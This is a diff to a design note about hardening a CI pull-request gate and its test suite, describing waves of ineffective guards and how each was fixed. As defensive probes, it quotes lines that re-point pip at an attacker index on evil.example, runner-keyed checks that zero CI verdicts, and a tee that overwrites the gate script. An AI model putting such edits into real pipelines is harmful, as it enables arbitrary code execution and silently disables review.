@@ -468,7 +468,7 @@ A full `--all` run is 14 checks in about 17 seconds, of which the branch-scope *
 so the gate costs roughly one branch-scope run more than nothing, and a typical docs-only
 selection is a couple of seconds.
 
-Verified by `tests/test_pr_gate.py` (517 checks, hermetic throwaway repos, no network), which
+Verified by `tests/test_pr_gate.py` (547 checks, hermetic throwaway repos, no network), which
 drives the verdict rather than the helpers. Every mutation below is confirmed to fail the
 suite: a prefix trigger loosened to a substring match, a two-dot diff, a runtime failure
 reclassified as advisory, a gating failure that still exits 0, a missing dependency counted
@@ -551,10 +551,10 @@ one-job rule below retired it, and the entry is named rather than deleted becaus
 rule is exactly this: a second job now needs the rule updated, and a reader who finds the old claim
 in a diff should know it was withdrawn deliberately.
 
-The doubled shapes are there because **a hundred and forty-nine of these guards were vacuous on the first
-attempt**, in twenty-two waves of 7, 5, 26, 2, 14, 3, 3, 6, 5, 2, 1, 6, 8, 11, 6, 9, 2, 5, 12, 4, 5 and 7 — each wave a narrower version
+The doubled shapes are there because **a hundred and fifty-six of these guards were vacuous on the first
+attempt**, in twenty-three waves of 7, 5, 26, 2, 14, 3, 3, 6, 5, 2, 1, 6, 8, 11, 6, 9, 2, 5, 12, 4, 5, 7 and 7 — each wave a narrower version
 of one mistake, and each found *after* the previous wave's fix was reported complete. Not every wave
-gets a paragraph below, and the paragraphs do not follow the tally's order: the numbers count waves,
+gets a paragraph below, and the paragraphs skip two of the tally's terms: the numbers count waves,
 the prose keeps the instructive ones, and two of the small waves appear only in the count.
 
 The first seven tested that a string appeared *somewhere* rather than
@@ -878,7 +878,9 @@ refused, it turned out, only in the space-separated spelling, because one word b
 satisfied "every trailing token is an option".
 
 The widest of the five is the most instructive, and it is a structural point rather than a bug:
-**the masking rule was a blacklist in a file of whitelists.** It was written up here as the *last* one,
+**the masking rule was a blacklist in a file of whitelists** — nearly: the `printf` rule still refuses
+`-v` by name, so "a file of whitelists" is the direction of travel and one rule short of a description.
+It was written up here as the *last* one,
 which was wrong at the time and worth recording as an error rather than quietly correcting: two more —
 the `set` flag rule and pip's trailing-option rule — were also blacklists, and both were found to have
 holes of precisely this shape a round later, and inverted for precisely this reason. "The last one" is
@@ -901,7 +903,7 @@ passed, nine times over — and the total-count invariant is the only thing that
 **The nineteenth wave is the first whose findings were mostly not about the workflow at all, and that is
 the finding.** Nine of its twelve live false greens mutate `pr_gate.py` — the script the workflow runs —
 and every probe harness up to this point could edit the YAML and almost nothing else (the round-1/2
-file reaches `pr_gate.py` for a single trigger-list mutation, and that is the whole of it). A guard suite of 487 checks had grown
+file reaches `pr_gate.py` for a single trigger-list mutation, and that is the whole of it). A guard suite of 443 checks had grown
 around one artifact while the artifact it protects had moved: selection, claim accounting and check argv
 all decide whether anything runs, and all three sat outside every sweep. `git diff … -- ":!tests/"`
 reported a clean `tests/` tree, so editing this very file selected nothing; `pytest --collect-only`
@@ -948,7 +950,7 @@ thing. `$?` is whatever ran last; `$code` is a variable that already holds the v
 A crash sat alongside them, and it is the more dangerous defect of the two kinds. A step with no `name:`
 — `- uses: actions/cache@v4`, the most ordinary Actions spelling there is — put `None` into a set the
 suite then sorted, and `sorted()` cannot order `None` against `str`. Because the failure detail is
-evaluated eagerly, it raised on the *passing* iteration, aborting the run about 275 checks early: the
+evaluated eagerly, it raised on the *passing* iteration, aborting the run about 375 checks early: the
 total-count invariant that exists to notice a rule which stopped running never ran either. Three sibling
 *messages* had already been given the defensive spelling; their subjects had not.
 
@@ -974,7 +976,7 @@ python -m pip install -U pip -ihttps://evil.example/simple      # 487/487 checks
 `-U` instead of `--upgrade` breaks the prefix; the glommed `-i` keeps the URL from looking like a bare
 package. Two characters of reordering, and CI installs the gate's dependencies from an
 attacker-controlled index — arbitrary code execution in the job whose purpose is to be trusted. The
-suite already asserted, in seventeen table rows, that `-ihttps://…` is refused. Every one of those rows
+suite already asserted, in eighteen table rows — one of them asserting exactly this `-ihttps://…` form — that a re-pointed index is refused. Every one of those rows
 called `pip_tail_ok` **directly**. The authorising path called something else. A table that tests a
 helper in isolation says nothing about the decision the workflow actually gets, and the seventeen rows
 made the surface look thoroughly covered, which is worse than looking uncovered.
@@ -1009,7 +1011,7 @@ promising a path stops being claimed the moment no check names it — and then u
 suite lists in unconditionally, so deleting a whole check left its suites claimed by nobody running
 them while discovery printed "none unclaimed". The accounting lie survived inside its own fix. And a
 `[0]` on a list that used to be a literal and is now derived from `os.path.isdir` aborted the run on an
-`IndexError` if the harness directories ever move — throwing away ~445 checks including, again, the
+`IndexError` if the harness directories ever move — throwing away ~465 checks including, again, the
 invariant whose one job is announcing that a rule stopped running. That is the second time in two waves
 that an eager crash silenced the count invariant.
 
@@ -1065,6 +1067,50 @@ five of those legitimately (the tail rule feeds `executes`, which feeds job iden
 message that surfaces names the outermost rule). The one that was not legitimate is now asserted
 directly, as a control that names the whitelist instead of inferring it from a sweep.
 
+**The twenty-third wave found the most severe hole of the whole run, and it was not in a rule — it was
+in the assumption that reading the workflow tells you what CI does.** Every pip rule in this file
+inspects the text `python -m pip install ${reqs}` and pins each word of it. But `${reqs}` is the
+*stdout of `pr_gate.py`*, interpolated unquoted under `set -f` precisely so that it word-splits, so
+every token the generator prints becomes its own word in pip's argv. One token added to a dict in the
+generator:
+
+```python
+CO_REQUIRES = {"cumulusci": ["--index-url=https://evil.example/simple", "setuptools>=75.4,<77"]}
+PINS = {"cumulusci": "cumulusci==4.8.1 --extra-index-url https://evil.example/simple"}
+```
+
+and CI installs from an arbitrary index before any check runs, with the workflow text untouched and the
+suite reporting 503/503. This is the same hole the wave before it closed on the YAML side, reached
+through the generator instead — so the general form is worth stating plainly: **pinning the consumer of
+a generated value proves nothing about the value.** The payload is now read where it is produced, and
+every token it emits must be a bare requirement specifier.
+
+Two more of the wave's findings were invisible for a reason that no amount of care inside a rule would
+have fixed: **every rule in this file runs on a laptop, and a predicate keyed on the runner does not.**
+
+```python
+if code and os.environ.get("RUNNER_OS"): code = 0   # Actions always sets it: every verdict zeroed
+if os.environ.get("GITHUB_ACTIONS"): return []      # CI selects nothing, prints "All … passed"
+```
+
+Both pass locally and both defeat CI completely, and no fixture can catch them, because the fixture is
+the laptop. Enumerating the runner's variables is the losing game, so the property asserted instead is
+that the gate reads *no* environment variable at all — behaviour that cannot differ between the two
+places has no room for a discrepancy. It is the first rule here aimed at the suite's own blind spot
+rather than at the code.
+
+The wave's other four were narrower versions of things this file already knew. A tree-exclusion filter
+can key on a suffix, a basename or a dot-prefix, and the fixture written a wave earlier committed one
+file per top-level *tree* — twelve of twenty trigger roots, dropping every dot-directory, so
+`not f.startswith(".github/")` stopped a workflow edit from selecting the checks that guard the
+workflow. It now commits one file per *trigger*, using the trigger's own path so that a filter keyed on
+a basename cannot tell the probe from the real thing. The `DIFF_ARGV` pin was a substring match whose
+own comment named the threat it could not see ("the danger is an *added* argument"): concatenating
+`+ ["--", ":(exclude).github"]` leaves the pinned text verbatim, so the argv is now read structurally
+and must be a single list literal. And a check's failure could be printed and then dropped from the
+accounting by naming it — `if check["name"] != "pr_gate_suite": failures.append(...)` prints `[FAIL]`
+and exits 0, which makes every guard in this file unenforceable at once.
+
 One listed "correct edit" turned out to be wrong, which is worth as much as a hole. `| tee gate.log`
 is refused, and should be: `tee` is a write channel with a command's spelling, so `| tee
 scripts/ai/pr_gate.py` rewrites the script the job runs. Refusing it is the redirection ban applied to
@@ -1106,13 +1152,13 @@ instead of re-deriving. That claim is true again, by a different mechanism: `JOB
 job's keys, so an `if:` on the job fails wherever it is placed, before or after `steps:`. The
 withdrawal outlived its reason — the same defect one turn further on, and the reason this paragraph
 now names the rule that makes the claim true instead of asserting the claim.
-The corpus is kept for that reason — 154 mutations, 78 loosening probes and 40
+The corpus is kept for that reason — 147 mutations, 89 loosening probes and 40
 correct-edit assertions across five files — but **not in
 this repository**: it lives at `.agents/artifacts/sweeps/`, which `.gitignore` excludes, because this
 project keeps agent working output out of the public tree and because these files mutate the very
 workflow CI runs. So that figure is a local result, reproducible by whoever holds that tree and not
 from a fresh clone; promoting the corpus to a tracked harness under `tests/` is an open question rather
-than an oversight. Keeping it only helps if it still runs, and all three files named a virtualenv under
+than an oversight. Keeping it only helps if it still runs, and all three of the mutation files named a virtualenv under
 `/tmp` that the OS had since reaped, so the corpus was unrunnable at the exact moment a later round
 needed it. They now default to the interpreter running them (`SWEEP_PY` overrides).
 
